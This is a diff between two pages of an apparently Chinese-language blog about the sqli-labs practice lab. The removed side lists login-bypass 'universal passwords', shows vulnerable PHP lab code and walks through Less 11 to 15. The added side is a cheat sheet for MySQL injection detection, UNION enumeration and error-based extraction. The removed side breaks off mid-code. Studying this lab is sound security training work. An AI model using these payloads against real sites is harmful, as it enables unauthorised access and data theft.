@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="Less-11 POST - Error Based - Single quotes - String基于报错的单引号字符注入如何绕过身份验证登入进去？万能密码登入常用万能密码 asp、aspx 1:   &amp;quot;or &amp;quot;a&amp;quot;=&amp;quot;a 2： &amp;apos;)or(&amp;apos;a&amp;apos;=&amp;apos;a 3：or 1=1-- 4：&amp;apos;or 1=1-- 5：a">
+<meta name="description" content="sqli-labs-Summarize-Less-1-22(Basic-Injections)重要的系统数据库mysql.user 存储MySQL数据库的用户及用户权限信息 and (select count(*) from mysql.user)&amp;gt; 判断是否具有读写权限  information_schema.user_privileges存储mysql中所有数据库的权限信息  infor">
 <meta name="keywords" content="sql注入,sqli-labs">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sqli-labs-Less-11-16">
-<meta property="og:url" content="http://yoursite.com/2018/04/23/sqli-labs-Less-11-16/index.html">
+<meta property="og:title" content="sqli-labs-Summarize-Less-1-22_Basic-Injections">
+<meta property="og:url" content="http://yoursite.com/2018/07/04/sqli-labs-Summarize-Less-1-22-Basic-Injections/index.html">
 <meta property="og:site_name" content="Ahodor&#39;Via">
-<meta property="og:description" content="Less-11 POST - Error Based - Single quotes - String基于报错的单引号字符注入如何绕过身份验证登入进去？万能密码登入常用万能密码 asp、aspx 1:   &amp;quot;or &amp;quot;a&amp;quot;=&amp;quot;a 2： &amp;apos;)or(&amp;apos;a&amp;apos;=&amp;apos;a 3：or 1=1-- 4：&amp;apos;or 1=1-- 5：a">
+<meta property="og:description" content="sqli-labs-Summarize-Less-1-22(Basic-Injections)重要的系统数据库mysql.user 存储MySQL数据库的用户及用户权限信息 and (select count(*) from mysql.user)&amp;gt; 判断是否具有读写权限  information_schema.user_privileges存储mysql中所有数据库的权限信息  infor">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-04-26T00:32:58.571Z">
+<meta property="og:updated_time" content="2018-07-04T03:13:34.713Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="sqli-labs-Less-11-16">
-<meta name="twitter:description" content="Less-11 POST - Error Based - Single quotes - String基于报错的单引号字符注入如何绕过身份验证登入进去？万能密码登入常用万能密码 asp、aspx 1:   &amp;quot;or &amp;quot;a&amp;quot;=&amp;quot;a 2： &amp;apos;)or(&amp;apos;a&amp;apos;=&amp;apos;a 3：or 1=1-- 4：&amp;apos;or 1=1-- 5：a">
+<meta name="twitter:title" content="sqli-labs-Summarize-Less-1-22_Basic-Injections">
+<meta name="twitter:description" content="sqli-labs-Summarize-Less-1-22(Basic-Injections)重要的系统数据库mysql.user 存储MySQL数据库的用户及用户权限信息 and (select count(*) from mysql.user)&amp;gt; 判断是否具有读写权限  information_schema.user_privileges存储mysql中所有数据库的权限信息  infor">
 
 
 
@@ -120,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/04/23/sqli-labs-Less-11-16/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/07/04/sqli-labs-Summarize-Less-1-22-Basic-Injections/"/>
 
 
 
 
 
-  <title>sqli-labs-Less-11-16 | Ahodor'Via</title>
+  <title>sqli-labs-Summarize-Less-1-22_Basic-Injections | Ahodor'Via</title>
   
 
 
@@ -287,7 +287,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/23/sqli-labs-Less-11-16/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/04/sqli-labs-Summarize-Less-1-22-Basic-Injections/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Ahodor">
@@ -304,7 +304,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">sqli-labs-Less-11-16</h1>
+          <h1 class="post-title" itemprop="name headline">sqli-labs-Summarize-Less-1-22_Basic-Injections</h1>
         
 
         <div class="post-meta">
@@ -316,8 +316,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-23T13:43:17+08:00">
-                2018-04-23
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-07-04T11:09:55+08:00">
+                2018-07-04
               </time>
             
 
@@ -354,309 +354,125 @@
       
 
       
-        <h2 id="Less-11-POST-Error-Based-Single-quotes-String"><a href="#Less-11-POST-Error-Based-Single-quotes-String" class="headerlink" title="Less-11 POST - Error Based - Single quotes - String"></a>Less-11 POST - Error Based - Single quotes - String</h2><h3 id="基于报错的单引号字符注入"><a href="#基于报错的单引号字符注入" class="headerlink" title="基于报错的单引号字符注入"></a>基于报错的单引号字符注入</h3><p>如何绕过身份验证登入进去？<strong>万能密码登入</strong><br>常用万能密码</p>
-<pre><code>asp、aspx
-1:   &quot;or &quot;a&quot;=&quot;a
-2： &apos;)or(&apos;a&apos;=&apos;a
-3：or 1=1--
-4：&apos;or 1=1--
-5：a&apos;or&apos; 1=1--
-6： &quot;or 1=1--
-7：&apos;or&apos;a&apos;=&apos;a
-8： &quot;or&quot;=&quot;a&apos;=&apos;a
-9：&apos;or&apos;&apos;=&apos;
-10：&apos;or&apos;=&apos;or&apos;
-11: 1 or &apos;1&apos;=&apos;1&apos;=1
-12: 1 or &apos;1&apos;=&apos;1&apos; or 1=1
-13: &apos;OR 1=1%00
-14: &quot;or 1=1%00
-15: &apos;xor
-16: 新型万能登陆密码
-用户名 &apos; UNION Select 1,1,1 FROM admin Where &apos;&apos;=&apos; （替换表名admin）
-密码 1
-Username=-1%cf&apos; union select 1,1,1 as password,1,1,1 %23
- Password=1
- 17..admin&apos; or &apos;a&apos;=&apos;a 密码随便
+        <h1 id="sqli-labs-Summarize-Less-1-22-Basic-Injections"><a href="#sqli-labs-Summarize-Less-1-22-Basic-Injections" class="headerlink" title="sqli-labs-Summarize-Less-1-22(Basic-Injections)"></a>sqli-labs-Summarize-Less-1-22(Basic-Injections)</h1><h2 id="重要的系统数据库"><a href="#重要的系统数据库" class="headerlink" title="重要的系统数据库"></a>重要的系统数据库</h2><pre><code>mysql.user 存储MySQL数据库的用户及用户权限信息
+and (select count(*) from mysql.user)&gt; 判断是否具有读写权限
 
-PHP万能密码
-&apos;or&apos;=&apos;or&apos; 
-&apos;or 1=1/* 字符型 GPC是否开都可以使用
-User: something
-Pass: &apos; OR &apos;1&apos;=&apos;1
+information_schema.user_privileges存储mysql中所有数据库的权限信息
 
-jsp 万能密码 
-1&apos;or&apos;1&apos;=&apos;1
-admin&apos; OR 1=1/*
-用户名：admin 系统存在这个用户的时候 才用得上
-密码：1&apos;or&apos;1&apos;=&apos;1
-</code></pre><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><h3 id="（1）万能密码"><a href="#（1）万能密码" class="headerlink" title="（1）万能密码"></a>（1）万能密码</h3><p>在passwd字段后面构造<strong>万能密码+闭合单引号</strong></p>
-<pre><code>uname=admin&amp;passwd=1&apos; or &apos;1&apos;=&apos;1&amp;submit=Submit
-返回
-Your Login name:Dumb
-Your Password:Dumb
-</code></pre><p>在uname字段后面构造<strong>万能密码+闭合单引号</strong></p>
-<pre><code>uname=admin&apos; or &apos;1&apos;=&apos;1&amp;passwd=1&amp;submit=Submit
-返回
-Your Login name:admin
-Your Password:admin
-</code></pre><p>我们发现两者返回的账户密码不一样，查看源代码</p>
-<pre><code>    &lt;?php
-//including the Mysql connect parameters.
-include(&quot;../sql-connections/sql-connect.php&quot;);
-error_reporting(0);
+information_schema.schemate 存储mysql中所有的数据库
+遍历查询系统中所有数据库名
+select schema_name from information_schema.schemata limit 0,1
 
-// take the variables
-if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;]))
-{
-    $uname=$_POST[&apos;uname&apos;];
-    $passwd=$_POST[&apos;passwd&apos;];
+information_schema.tables 存储mysql中所有数据库的表
+遍历查询数据库中所有的表名
+select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1
 
-    //logging the connection parameters to a file for analysis.
-    $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);
-    fwrite($fp,&apos;User Name:&apos;.$uname);
-    fwrite($fp,&apos;Password:&apos;.$passwd.&quot;\n&quot;);
-    fclose($fp);
+information_schema.columns存储mysql中所有数据库的列
+遍历查询表中所有的列名
+select column_name form information_schema.columns where table_name=&apos;users&apos; limit 0,1
 
+遍历查询表中的数据
+select password from security.users limit 0,1
+</code></pre><h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><h3 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h3><p><strong>select</strong> 用于输出信息</p>
+<pre><code>select 列名|（数字|字符串|函数）as 别名（as可以省略）[from ...]
+</code></pre><p><strong>union</strong> 联合操作符，要求前后列数相同，数据类型相差不大</p>
+<p><strong>group by</strong> 分组</p>
+<p><strong>order by</strong> 排序，常用于猜解字段数</p>
+<pre><code>order by 列名|序列号 
+</code></pre><p><strong>sql的switch</strong>语句</p>
+<pre><code>case expr when a then a** when b then b* else c* end 
+</code></pre><p><strong>if 函数</strong>，当expr1为真返回expr2否则返回expr3</p>
+<pre><code>if(expr1,expr2,expr3) 
+</code></pre><h3 id="常用函数（获取系统信息）"><a href="#常用函数（获取系统信息）" class="headerlink" title="常用函数（获取系统信息）"></a>常用函数（获取系统信息）</h3><pre><code>system_user()        /*系统用户名
+user()               /*用户名
+current_user()       /*当前用户名
+session_user()       /*连接数据库的用户名
+database()           /*数据库名
+version()            /*MYSQL数据库版本
+load_file()          /*MYSQL读取本地文件的函数
+@@datadir            /*读取数据库路径
+@@basedir MYSQL      /*安装路径
+@@version_compile_os /*操作系统
+</code></pre><h3 id="常用字符串函数"><a href="#常用字符串函数" class="headerlink" title="常用字符串函数"></a>常用字符串函数</h3><pre><code>concat()                          /*连接字符串
+group_concat()
+concat_ws()                       /*连接字符串，第一个参数为分隔符
+char()                            /*获得字符串
+left(str, len)                    /*截取str左边len位  
+right(str, len)                   /*截取str右边len位
+substring(str, pos, len)          /*截取字符串
+rand()                            /*生成0至1的随机数
+floor(n)                          /*向下取整 
+name_conset(column_name, value)   /*用来产生一个结果集合
 
-    // connectivity 
-    @$sql=&quot;SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1&quot;;
-    $result=mysql_query($sql);
-    $row = mysql_fetch_array($result);
+sleep(seconds) 停止seconds秒，用于time-based盲注
+benchmark(times, function) 将function执行times次，该函数可用于time-based盲注，例如（benchmark(500000, encode(‘a’,’b&apos;))）
+encode(str, passwd_str) 使用passwd_str加密str函数
+</code></pre><h2 id="判断是否可以注入"><a href="#判断是否可以注入" class="headerlink" title="判断是否可以注入"></a>判断是否可以注入</h2><h3 id="使用标点符号-单引号，双引号，括号-判断注入，例如："><a href="#使用标点符号-单引号，双引号，括号-判断注入，例如：" class="headerlink" title="使用标点符号(单引号，双引号，括号)判断注入，例如："></a>使用标点符号(单引号，双引号，括号)判断注入，例如：</h3><pre><code>http://aaa.com/s.php?id=1&apos;
+如果返回页面提示syntax error，则说明有漏洞
+</code></pre><h3 id="通过附加逻辑运算判断注入，例如："><a href="#通过附加逻辑运算判断注入，例如：" class="headerlink" title="通过附加逻辑运算判断注入，例如："></a>通过附加逻辑运算判断注入，例如：</h3><pre><code>http://aaa.com/s.php?id=1 and 1=1/and 1=2
+and 1=1有返回，and 1=2无返回
+</code></pre><h3 id="通过算数运算判断注入点，例如："><a href="#通过算数运算判断注入点，例如：" class="headerlink" title="通过算数运算判断注入点，例如："></a>通过算数运算判断注入点，例如：</h3><pre><code>http://aaa.com/s.php?id=11-1
+</code></pre><h3 id="通过select语句判断注入点，例如："><a href="#通过select语句判断注入点，例如：" class="headerlink" title="通过select语句判断注入点，例如："></a>通过select语句判断注入点，例如：</h3><pre><code>http://aaa.com/s.php?id=(select 10)
+</code></pre><h3 id="通过时间函数判断注入点，例如："><a href="#通过时间函数判断注入点，例如：" class="headerlink" title="通过时间函数判断注入点，例如："></a>通过时间函数判断注入点，例如：</h3><pre><code>http://aaa.com/s.php?id=2 and sleep(10)
+或者http://aaa.com/s.php?id=2 and benchmark(500000, encode(&apos;msg&apos;,&apos;bbb&apos;))
+</code></pre><h2 id="常规注入流程"><a href="#常规注入流程" class="headerlink" title="常规注入流程"></a>常规注入流程</h2><h3 id="猜解列数"><a href="#猜解列数" class="headerlink" title="猜解列数"></a>猜解列数</h3><pre><code>order by n /*（注释符 /*  # --）
+</code></pre><h3 id="查询mysql基本信息-假设数据库表有7列"><a href="#查询mysql基本信息-假设数据库表有7列" class="headerlink" title="查询mysql基本信息(假设数据库表有7列)"></a>查询mysql基本信息(假设数据库表有7列)</h3><pre><code>and 1=2 union select 1,2,3,concat_ws(char(32,58,32),0x7c,user(),database(),version()),5,6,7/* 
+例如：select * from sedb.site_tb where 1=2 union select 1,2,concat_ws(char(32,58,32),0x7c,user(),database(),version());
+</code></pre><h3 id="查询mysql数据库中有哪些数据库-注意使用limit限制查询的范围"><a href="#查询mysql数据库中有哪些数据库-注意使用limit限制查询的范围" class="headerlink" title="查询mysql数据库中有哪些数据库(注意使用limit限制查询的范围)"></a>查询mysql数据库中有哪些数据库(注意使用limit限制查询的范围)</h3><pre><code>and 1=2 union select 1,schema_name,3,4 from information_schema.schemata/*
 
-    if($row)
-    {
-        //echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;;    
+and 1=2 union select 1,group_concat(schema_name),3,4 from information_schema.schemata/*
 
-        echo &quot;&lt;br&gt;&quot;;
-        echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&apos;;
-        //echo &quot; You Have successfully logged in\n\n &quot; ;
-        echo &apos;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&apos;;    
-        echo &quot;&lt;br&gt;&quot;;
-        echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];
-        echo &quot;&lt;br&gt;&quot;;
-        echo &apos;Your Password:&apos; .$row[&apos;password&apos;];
-        echo &quot;&lt;br&gt;&quot;;
-        echo &quot;&lt;/font&gt;&quot;;
-        echo &quot;&lt;br&gt;&quot;;
-        echo &quot;&lt;br&gt;&quot;;
-        echo &apos;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&apos;;    
+例如：select * from site_tb where 1=2 union select 1, 2, group_concat(schema_name) from information_schema.schemata;
+</code></pre><h3 id="查询某个数据库中有哪些表（数据库名可能需要16进制）"><a href="#查询某个数据库中有哪些表（数据库名可能需要16进制）" class="headerlink" title="查询某个数据库中有哪些表（数据库名可能需要16进制）"></a>查询某个数据库中有哪些表（数据库名可能需要16进制）</h3><pre><code>and 1=2 union select 1,2,3,4,table_name,5 from information_schema.tables where table_schema=数据库名
 
-        echo &quot;&lt;/font&gt;&quot;;
-    }
-    else  
-    {
-        echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;;
-        //echo &quot;Try again looser&quot;;
-        print_r(mysql_error());
-        echo &quot;&lt;/br&gt;&quot;;
-        echo &quot;&lt;/br&gt;&quot;;
-        echo &quot;&lt;/br&gt;&quot;;
-        echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&apos;;    
-        echo &quot;&lt;/font&gt;&quot;;  
-    }
-}
+and 1=2 union select 1,2,3,4,group_concat(table_name),5 from information_schema.tables where table_schema=数据库名
 
-?&gt;
-sql语句如下：
-SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1
-情况一：
+例如：select * from site_tb where 1=2 union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema=&apos;sedb&apos;;
+</code></pre><h3 id="查询某个表中有哪些字段（表名、数据库名可能需要16进制）"><a href="#查询某个表中有哪些字段（表名、数据库名可能需要16进制）" class="headerlink" title="查询某个表中有哪些字段（表名、数据库名可能需要16进制）"></a>查询某个表中有哪些字段（表名、数据库名可能需要16进制）</h3><pre><code>and 1=2 union select 1,2,3,4,column_name,5,6,7 from information_schema.columns where table_name=表名 and table_schema=数据库名 limit 1,1/*
 
-    SELECT username, password FROM users WHERE username=&apos;admin&apos; and password=&apos;1&apos; or &apos;1&apos;=&apos;1&apos; LIMIT 0,1
-情况二：
+and 1=2 union select 1,2,3,4,group_concat(column_name),5,6,7 from information_schema.columns where table_name=表名 and table_schema=数据库名/*
 
-    SELECT username, password FROM users WHERE username=&apos;admin&apos; or &apos;1&apos;=&apos;1&apos; and password=&apos;1&apos; LIMIT 0,1
-</code></pre><p><strong>and</strong> 优先级高，所以情况一<strong>前面为False</strong>，但是<strong>与True或运算为true</strong>，返回了第一个账号和密码；情况二<strong>后面为False，但存在admin这个账户，或运算为True</strong>，返回了admin账号的账号和密码</p>
-<h3 id="（2）联合查询"><a href="#（2）联合查询" class="headerlink" title="（2）联合查询"></a>（2）联合查询</h3><pre><code>uname=test &amp;passwd=test&apos; order by 3%23 返回错误
-uname=test &amp;passwd=test&apos; order by 2%23 返回正确
-uname=test &amp;passwd=test&apos; union select 1,2 %23
-返回：Your Login name:1 
-    Your Password:2
-</code></pre><p>剩下的注入查询数据库信息与之前get类似</p>
-<h2 id="Less-12-POST-Error-Based-Double-quotes-String-with-twist"><a href="#Less-12-POST-Error-Based-Double-quotes-String-with-twist" class="headerlink" title="Less-12 POST - Error Based - Double quotes - String -with twist"></a>Less-12 POST - Error Based - Double quotes - String -with twist</h2><h3 id="基于报错的双引号带括号的字符注入"><a href="#基于报错的双引号带括号的字符注入" class="headerlink" title="基于报错的双引号带括号的字符注入"></a>基于报错的双引号带括号的字符注入</h3><p>与Less-11类似</p>
-<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><pre><code>1、直接注释
-uname=admin &amp;passwd=1&quot;) or &quot;1&quot;=&quot;1&quot; %23
-2、闭合绕过
-uname=admin &amp;passwd=1&quot;) or (&quot;1&quot;=&quot;1
-uname=admin&quot;) or( &quot;1&quot;=&quot;1 &amp;passwd=1
+例如：select * from site_tb where 1=2 union select 1, 2, group_concat(column_name) from information_schema.columns where table_name=&apos;site_tb&apos; and table_schema=&apos;sedb&apos;;
+</code></pre><h3 id="查询数据："><a href="#查询数据：" class="headerlink" title="查询数据："></a>查询数据：</h3><pre><code>and 1=2 union select 1,2,3,字段1,5,字段2,7,8 from 数据库.表/*
+</code></pre><h2 id="MySql报错注入"><a href="#MySql报错注入" class="headerlink" title="MySql报错注入"></a>MySql报错注入</h2><p>假设查询语句为：</p>
+<pre><code>select name,password from test.user where id={参数}
+</code></pre><p>{参数}：按照mysql语法，where后可以跟and、union，因此可以1 and (select <em>)以及1 union select </em>来触发报错注入</p>
+<p>因此插入报错语句位置如下：</p>
+<pre><code>select colum1,colum2 from table where id={0} and {1} union {2}
+</code></pre><h3 id="使用floor-left-right："><a href="#使用floor-left-right：" class="headerlink" title="使用floor/left/right："></a>使用floor/left/right：</h3><pre><code>select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a;
 
-联合查询
-uname=test &amp;passwd=test&quot;) order by 3 %23返回错误
-uname=test &amp;passwd=test&quot;) order by 2 %23返回正确
-uname=test &amp;passwd=test&quot;) union select 1,2 %23
-返回：
-Your Login name:1
-Your Password:2
-同上
-</code></pre><h2 id="Less-13-POST-Double-Injection-Single-quotes-String-with-twist"><a href="#Less-13-POST-Double-Injection-Single-quotes-String-with-twist" class="headerlink" title="Less-13 POST-Double Injection-Single quotes-String -with twist"></a>Less-13 POST-Double Injection-Single quotes-String -with twist</h2><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><pre><code>加单引号
-uname=test &amp;passwd=test&apos;
-报错如下 &apos;&apos;test&apos;&apos;) LIMIT 0,1&apos;
-</code></pre><p>可知是单引号和括号包裹变量</p>
-<pre><code>uname=test &amp;passwd=test&apos;) %23返回正常
-uname=test &amp;passwd=test&apos;) or 1=1%23 显示successfully loggend in 
-</code></pre><p>源代码如下：</p>
-<pre><code>&lt;?php
-//including the Mysql connect parameters.
-include(&quot;../sql-connections/sql-connect.php&quot;);
-error_reporting(0);
+select 1 from (select concat(user(),left(rand(),3)),count(*) from information_schema.tables group by 1)a;
 
-// take the variables
-if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;]))
-{
-    $uname=$_POST[&apos;uname&apos;];
-    $passwd=$_POST[&apos;passwd&apos;];
+select 1 from (select concat(user(),right(rand(),3)),count(*) from information_schema.tables group by 1)a;
+</code></pre><p>例如：</p>
+<pre><code>select name,password from user where id=1 union select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a
+ERROR 1062 (23000): Duplicate entry &apos;root@localhost1&apos; for key &apos;group_key&apos;
+</code></pre><h3 id="使用name-const："><a href="#使用name-const：" class="headerlink" title="使用name_const："></a>使用name_const：</h3><pre><code>select 1 from (select name_const(version(),1),name_const(version(),1))x
+</code></pre><p>例如：</p>
+<pre><code>select name,password from test.user where id=1 union select 1 from (select name_const(version(),1), name_const(version(), 1))x;
+</code></pre><h3 id="使用updatexml："><a href="#使用updatexml：" class="headerlink" title="使用updatexml："></a>使用updatexml：</h3><pre><code>updatexml(1,concat(0x3a,user()),1)
+</code></pre><p>例如：</p>
+<pre><code>select name,password from test.user where id=2 and updatexml(1,concat(0x3a,user()),1);
+</code></pre><h3 id="使用extractvalue："><a href="#使用extractvalue：" class="headerlink" title="使用extractvalue："></a>使用extractvalue：</h3><pre><code>extractvalue(1, concat(0x5c,version()))
+</code></pre><p>例如：</p>
+<pre><code>select name,password from test.user where id=2 and extractvalue(1, concat(0x5c, version()));
+</code></pre><h3 id="使用exp："><a href="#使用exp：" class="headerlink" title="使用exp："></a>使用exp：</h3><pre><code>exp(~(select*from(select user())x))
+</code></pre><p>例如：</p>
+<pre><code>select name,password from test.user where id=exp(~(select*from(select user())x));
+</code></pre><h3 id="使用GeometryCollection："><a href="#使用GeometryCollection：" class="headerlink" title="使用GeometryCollection："></a>使用GeometryCollection：</h3><pre><code>GeometryCollection((select * from (select * from(select user())a)b))
 
-    //logging the connection parameters to a file for analysis.
-    $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);
-    fwrite($fp,&apos;User Name:&apos;.$uname.&quot;\n&quot;);
-    fwrite($fp,&apos;Password:&apos;.$passwd.&quot;\n&quot;);
-    fclose($fp);
+polygon((select * from (select * from(select user())a)b))
 
+multipoint((select * from (select * from(select user())a)b))
 
-    // connectivity 
-    @$sql=&quot;SELECT username, password FROM users WHERE username=(&apos;$uname&apos;) and password=(&apos;$passwd&apos;) LIMIT 0,1&quot;;
-    $result=mysql_query($sql);
-    $row = mysql_fetch_array($result);
+multilinestring((select * from (select * from(select user())a)b))
 
-    if($row)
-    {
-        //echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;;    
+multipolygon((select * from (select * from(select user())a)b))
 
-        echo &quot;&lt;br&gt;&quot;;
-        echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&apos;;
-        //echo &quot; You Have successfully logged in &quot; ;
-        echo &apos;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&apos;;    
-        echo &quot;&lt;br&gt;&quot;;
-        //echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];
-        //echo &quot;&lt;br&gt;&quot;;
-        //echo &apos;Your Password:&apos; .$row[&apos;password&apos;];
-        //echo &quot;&lt;br&gt;&quot;;
-        echo &quot;&lt;/font&gt;&quot;;
-        echo &quot;&lt;br&gt;&quot;;
-        echo &quot;&lt;br&gt;&quot;;
-        echo &apos;&lt;img src=&quot;../images/flag.jpg&quot;   /&gt;&apos;;    
-
-        echo &quot;&lt;/font&gt;&quot;;
-    }
-    else  
-    {
-        echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;;
-        //echo &quot;Try again looser&quot;;
-        print_r(mysql_error());
-        echo &quot;&lt;/br&gt;&quot;;
-        echo &quot;&lt;/br&gt;&quot;;
-        echo &quot;&lt;/br&gt;&quot;;
-        echo &apos;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&apos;;    
-        echo &quot;&lt;/font&gt;&quot;;  
-    }
-}
-
-?&gt;
-</code></pre><p>登入成功返回的是flag.jpg图片，图片显示successfully logined in；失败是slap.jpg的图片。不会显示登入的账号和密码信息</p>
-<h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><h4 id="万能密码登入"><a href="#万能密码登入" class="headerlink" title="万能密码登入"></a>万能密码登入</h4><pre><code>uname=test &amp;passwd=test&apos;) or 1=1%23 
-</code></pre><h4 id="双注入查询"><a href="#双注入查询" class="headerlink" title="双注入查询"></a>双注入查询</h4><p>原理参考Less-5</p>
-<pre><code>uname=test &amp;passwd=test&apos;) or 1=1 order by 3 %23返回错误
-uname=test &amp;passwd=test&apos;) or 1=1 order by 2 %23返回正常
-uname=test &amp;passwd=test&apos;) or 1=1 union select 1,2 %23返回成功但是没有显示位
-</code></pre><p>使用<strong>双查询注入</strong>方式</p>
-<pre><code>uname=test &amp;passwd=test&apos;)  union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a %23
-返回
-Duplicate entry &apos;::security::1&apos; for key &apos;group_key&apos;
-</code></pre><p>剩下的参考Less-5</p>
-<h2 id="Less-14-POST-Double-Injection-Double-quotes-String-with-twist"><a href="#Less-14-POST-Double-Injection-Double-quotes-String-with-twist" class="headerlink" title="Less-14 POST-Double Injection-Double quotes-String-with twist"></a>Less-14 POST-Double Injection-Double quotes-String-with twist</h2><h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><pre><code>单引号
-uname=test &amp;passwd=test&apos; or 1=1 %23返回失败图片 
-双引号
-uname=test &amp;passwd=test&quot;or 1=1 %23 返回成功图片
-</code></pre><p>参数是由双引号包裹</p>
-<p>源代码</p>
-<pre><code>$uname=&apos;&quot;&apos;.$uname.&apos;&quot;&apos;;
-$passwd=&apos;&quot;&apos;.$passwd.&apos;&quot;&apos;; 
-@$sql=&quot;SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1&quot;;
-</code></pre><p>注意点号是起连接作用，将变量一前一后分别连接一个双引号<br>这里调试直接echo出变量可以看到</p>
-<pre><code>uname=uname &amp;passwd=passwd
-输出：&quot;uname &quot;&quot;passwd&quot;
-</code></pre><p>可以看到是单引号包裹着</p>
-<p>测试字段数    </p>
-<pre><code>uname=uname &amp;passwd=passwd&quot; or  1=1 order by 2 %23
-</code></pre><p>剩下的与Less-13相似</p>
-<h2 id="Less-15-POST-Blind-Boolian-time-Based-Single-quotes"><a href="#Less-15-POST-Blind-Boolian-time-Based-Single-quotes" class="headerlink" title="Less-15 POST-Blind-Boolian/time Based-Single quotes"></a>Less-15 POST-Blind-Boolian/time Based-Single quotes</h2><h3 id="基于布尔型或时间的单引号post盲注"><a href="#基于布尔型或时间的单引号post盲注" class="headerlink" title="基于布尔型或时间的单引号post盲注"></a>基于布尔型或时间的单引号post盲注</h3><h4 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h4><p>在后面添加<strong>单引号、双引号、括号</strong>等无任何错误显示，只显示一个错误的图片，错误回显应该是被注释了。</p>
-<pre><code>uname=uname &amp;passwd=passwd&apos; or 1=1 %23返回正确
-字段数
-uname=uname &amp;passwd=passwd&apos; or 1=1 order by 2 %23
-显示位
-uname=uname &amp;passwd=passwd&apos; or 1=1 union select 1,2 %23执行成功没有回显
-使用双查询输入
-uname=test &amp;passwd=test&apos; or 1=1  union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a %23 返回成功但并没有报错显示我们想要的数据
-</code></pre><h4 id="为什么Less13-14中使用双查询输入有效而在这里不行？"><a href="#为什么Less13-14中使用双查询输入有效而在这里不行？" class="headerlink" title="为什么Less13-14中使用双查询输入有效而在这里不行？"></a>为什么Less13-14中使用双查询输入有效而在这里不行？</h4><p>Less-15源代码</p>
-<pre><code>&lt;?php
-//including the Mysql connect parameters.
-include(&quot;../sql-connections/sql-connect.php&quot;);
-error_reporting(0);
-
-// take the variables
-if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;]))
-{
-    $uname=$_POST[&apos;uname&apos;];
-    $passwd=$_POST[&apos;passwd&apos;];
-
-    //logging the connection parameters to a file for analysis.
-    $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);
-    fwrite($fp,&apos;User Name:&apos;.$uname);
-    fwrite($fp,&apos;Password:&apos;.$passwd.&quot;\n&quot;);
-    fclose($fp);
-
-
-    // connectivity 
-    @$sql=&quot;SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1&quot;;
-    $result=mysql_query($sql);
-    $row = mysql_fetch_array($result);
-
-    if($row)
-    {
-        //echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;;    
-
-        echo &quot;&lt;br&gt;&quot;;
-        echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&apos;;
-        //echo &quot; You Have successfully logged in\n\n &quot; ;
-        echo &apos;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&apos;;    
-        echo &quot;&lt;br&gt;&quot;;
-        //echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];
-        echo &quot;&lt;br&gt;&quot;;
-        //echo &apos;Your Password:&apos; .$row[&apos;password&apos;];
-        echo &quot;&lt;br&gt;&quot;;
-        echo &quot;&lt;/font&gt;&quot;;
-        echo &quot;&lt;br&gt;&quot;;
-        echo &quot;&lt;br&gt;&quot;;
